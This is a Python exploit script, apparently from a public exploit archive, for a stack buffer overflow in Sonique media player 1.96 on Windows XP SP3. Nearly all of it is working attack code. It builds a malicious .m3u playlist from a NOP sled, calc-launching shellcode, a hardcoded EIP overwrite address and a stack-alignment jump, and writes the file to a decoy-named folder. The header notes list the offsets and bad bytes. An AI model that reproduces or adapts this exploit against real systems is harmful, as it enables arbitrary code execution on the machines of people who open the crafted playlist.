#Application: Sonique BOF EIP Overwrite
#Version:  1.96
#Author: Securityxxxpert
#Date Submitted:  May 17, 2011
#Download Link: http://www.tucows.com/preview/193562
#Tested on:  Windows XP SP3
#EIP Overwritten: 239 Bytes
#Pita Bytes:  0x00 0x83 0x88 0x93
#Notes:  Not universal, find your own offsets if not SP3 Eng
#Notes Cont:  4 Nops is added before aligning the stack in order to 
align the stack properly  without errors
#Humor: Waterbottle + Justin Bieber's Head = Pwnage
print 
"--------------------------------------------------------------------------------"
print "                                      Sonique Player 
Exploit                    "
print "                                      Retreat 
Hell!                             "
print "Greetz:  Acidgen, Subinacls, GrumpyBear, Pyoor, Corelanc0d3r, Dr. 
Nick, Rek0n   "
print "Greetz Cont: Connection, MaXe, ronin, 
Intern0t,                                  "
print "Greetz Cont:  Podjackel, g0tmi1k & The entire Corelan & Offensive 
Security Teams "
print 
"--------------------------------------------------------------------------------"
import os
filename = "waterbottle.m3u"

nopsled="\x90"*93 #Sliding to pwnage
sc=("\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0") 
#16 byte Calc Shellcode
filler = "\x90"*130
eip='\x6F\x9C\x10\x5D' #0x5D109C6F
alignjmp='\x83\xC3\x1c\x90'+'\xff\xe3' #Aligns the stack to EBX1c, then 
Jumps to EBX *EBX1C*
Junk='\x42' * 10000

exploit = nopsled + sc + filler + eip + "\x90"* 4 + alignjmp + Junk
os.makedirs ("./Justin.Beiber -My World")
os.chdir ("./Justin.Beiber -My World")
textfile = open(filename,"w")
textfile.write(exploit)
textfile.close()